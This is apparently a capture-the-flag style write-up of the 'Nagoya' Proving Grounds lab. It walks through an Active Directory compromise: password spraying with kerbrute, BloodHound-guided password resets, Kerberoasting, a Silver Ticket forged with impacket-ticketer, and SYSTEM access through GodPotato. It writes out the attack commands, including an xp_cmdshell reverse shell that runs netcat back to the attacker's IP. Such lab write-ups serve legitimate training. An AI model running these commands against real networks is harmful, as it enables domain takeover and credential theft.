---
layout: post
title: "Nagoya - Proving Grounds Practice"
summary: "Usernames on website → username-anarchy to generate username list → kerbrute user enumeration → add 2023 and 2023! at the and of generated password list with cewl → kerbrute brute force → bloodhound-python → GenericAll - ForceChangePassword change password → User Shell → Kerberoasting → svc_mssql password → ligolo-ng to reach mssql → mssql login → Silver Ticket Attack → impacket-ticketer and impacket-mssqlclient → MSSQL db admin → xp_cmdshell → SeImpersonatePrivilege → GodPatato → SYSTEM"
---

# Nagoya - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed common DC ports.

<img width="1128" height="422" alt="00nmap" src="https://github.com/user-attachments/assets/58be6cab-986f-497e-a253-f65ffb9eb666" />

I added necessary domains to `/etc/hosts` file. 

<img width="861" height="329" alt="01 0 etc hosts" src="https://github.com/user-attachments/assets/97c84de2-d608-4c57-b7a3-a572ca6d9770" />

### Web Enumeration
Website included many names.

<img width="1318" height="687" alt="01web" src="https://github.com/user-attachments/assets/3191d995-0702-4282-b9cf-696c924e009e" />

## Exploitation
### User Enumeration
So using `username-anarchy`, I created a userList.

<img width="625" height="330" alt="02userList" src="https://github.com/user-attachments/assets/1c345ba1-30cf-4319-99d1-e3d9d8c64821" />

Then using `kerbrute`, I applied user enumeration and noted valid usernames.

<img width="987" height="714" alt="03validusers" src="https://github.com/user-attachments/assets/823996c6-2242-4c96-b958-17664d3451a1" />

### Password Spraying
Later, I tried many techniques and non of them worked. Then I found that the website was created in 2023.

<img width="1324" height="814" alt="04nagoya" src="https://github.com/user-attachments/assets/64ab4da2-3b9a-451f-8221-5af286ed702b" />

So using `cewl` I created wordlist then appended `2023` and `2023!` at the end of each record using below command.

```bash
for i in $(cat password); do echo $i; echo ${i}2022; echo ${i}2023; echo ${i}\! ;done > pass.txt
```

Then I applied brute force using `kerbrute` and found valid credentials.

<img width="1019" height="723" alt="05found" src="https://github.com/user-attachments/assets/fbd0a061-9d1d-4988-a7b9-8aa95e74b4ee" />

### BloodHound
Then I executed `bloodhound-python`.

```bash
bloodhound-python -u 'andrea.hayes' -p 'Nagoya2023' -c all -ns 192.168.224.21 -d nagoya-industries.com --zip
```

<img width="959" height="355" alt="06bloodhound" src="https://github.com/user-attachments/assets/61d2a7e5-2d3a-43a7-b3eb-8cb48d1d9bea" />

And it revealed a path where I can apply force change password twice to get winRM shell. 

<img width="962" height="503" alt="07longway" src="https://github.com/user-attachments/assets/371f92a4-affa-492f-b796-5813cfbb93c6" />

I used below command to change user's password.

```bash
net rpc password "CHRISTOPHER.LEWIS" "Test1234." -U "nagoya-industries.com"/"iain.white"%"Test1234." -S "192.168.224.21"
```

<img width="1488" height="405" alt="08gg" src="https://github.com/user-attachments/assets/8f05680a-b369-4a80-81b7-46dc8587941f" />

Then I obtained user flag and winrm shell.

<img width="1039" height="736" alt="09localflag" src="https://github.com/user-attachments/assets/9fc3c421-f514-4219-93f8-ceb8ab7b11db" />

## Privilege Escalation
### Kerberoasting
Later I applied kerberoasting using `impacket-GetUserSPNs`.

```bash
impacket-GetUserSPNs nagoya-industries.com/'CHRISTOPHER.LEWIS':'Test1234.' -request
```

<img width="1478" height="686" alt="10sus" src="https://github.com/user-attachments/assets/f34ef607-78a9-4852-8708-480714e074d1" />

And I was able to crack `svc_mssql` password.

<img width="1486" height="654" alt="11cracked" src="https://github.com/user-attachments/assets/3abe1edf-7837-4e36-ae94-6c9f9df37908" />

### MSSQL Service
At first I tried many methods but could not find anything useful. Then I found MSSQL service is up but unreachable from outside.

<img width="686" height="370" alt="12suspicious" src="https://github.com/user-attachments/assets/65b9a435-6b3f-4acd-a201-df2004c58d8f" />

So I tried to exploit it locally with `PowerUpSQL` but I could not.

Later I set up `ligolo-ng` as shown below to reach local MSSQL service.
1. I set up an proxy

<img width="1359" height="799" alt="15proxy" src="https://github.com/user-attachments/assets/9ed5bb94-33f5-4624-a609-7e281cb7f33d" />

2. I executed the agent.exe

<img width="888" height="88" alt="14agent" src="https://github.com/user-attachments/assets/2838a54e-2558-4df1-8276-aa748a3478b6" />

With that setup, I was able to login to mssql. But to login I change `/etc/hosts` to `240.0.0.1`.

<img width="718" height="204" alt="16mssql login" src="https://github.com/user-attachments/assets/6b99e03f-73d7-4f10-9f9f-9150c642c676" />

### Silver Ticket
However, I had no permission, there were no links or no impersonation. So, as I am the service account I could exploit Silver Ticket to login MSSQL as administrator.

1. Generate NTLM hash for service account

<img width="1825" height="829" alt="17 0 ntlm" src="https://github.com/user-attachments/assets/5bf2772f-473c-4973-9685-388f6b70eb25" />

2. Create an administrator ticket using `impacket-ticketer`

```bash
impacket-ticketer -nthash "E3A0168BC21CFB88B95C954A5B18F57C" -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -spn "MSSQL/nagoya.nagoya-industries.com"  -domain "nagoya-industries.com" -user-id 500 "Administrator"
```

<img width="1483" height="296" alt="17silver ticket" src="https://github.com/user-attachments/assets/cffa1954-f9f9-433e-ad23-882f1524d7c1" />

3. Using `KRB55CCNAME` inject this ticket to obtain administrator MSSQL login.

```bash
KRB5CCNAME=Administrator.ccache impacket-mssqlclient -k nagoya.nagoya-industries.com
```

<img width="1211" height="704" alt="18zort" src="https://github.com/user-attachments/assets/3dc1a853-30d8-4e89-973c-0ea7de2354d8" />

### xp_cmdshell
Later, I simply executed `xp_cmdshell` to obtain reverse shell.

```sql
EXEC xp_cmdshell 'cmd /c C:\temp\nc64.exe 192.168.45.216 445 -e cmd.exe'
```

And I obtained the shell.

<img width="722" height="389" alt="19revshell" src="https://github.com/user-attachments/assets/228cdb17-2bc5-458b-821f-bcbd2e1d7d8a" />

### SeImpersonatePrivilege (GodPatato)
Then I downloaded GodPatato ([BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)) and executed it to obtain SYSTEM reverse shell.

<img width="840" height="505" alt="20godpatato" src="https://github.com/user-attachments/assets/d514ef3e-bd47-40b9-a61c-445291ec494a" />

I simply read Administrator flag.

<img width="845" height="707" alt="21gg" src="https://github.com/user-attachments/assets/781b45e7-6ccd-4780-a8cf-6d4a63a8592c" />
